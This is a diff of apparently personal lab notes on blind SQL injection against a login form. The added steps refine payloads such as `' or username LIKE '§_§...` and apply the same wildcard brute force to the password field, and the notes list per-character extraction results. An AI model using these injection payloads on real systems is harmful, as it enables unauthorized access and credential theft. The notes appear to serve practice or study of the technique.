@@ -22,7 +22,7 @@ apply command: ' or LENGTH(password)=§1§#&password=
 11. or git merge and commit why? of the git command
 12. apply attack brute-force with mondify package request
 http with 
-username=' or LIKE '§_§§_§§_§§_§§_§§_§§_§§_§&password=pwd
+username=' or username LIKE '§_§§_§§_§§_§§_§§_§§_§§_§&password=pwd
 and option payload set: 1
 optin payload type brute-force
 13. later remplace letter with greater that length
@@ -35,3 +35,7 @@ have: f position 1 and request 7 length 598
 	: h position 6 and request 194 length 598
 	: e position 7 and request 228 length 598
 	: r position 8 and request 278 length 598
+15. now, apply same in password:
+command: 
+username=' or password LIKE '§_§§_§§_§§_§§_§§_§§_§§_§&password=pwd
+this capture and edit package http in file test_4.txt
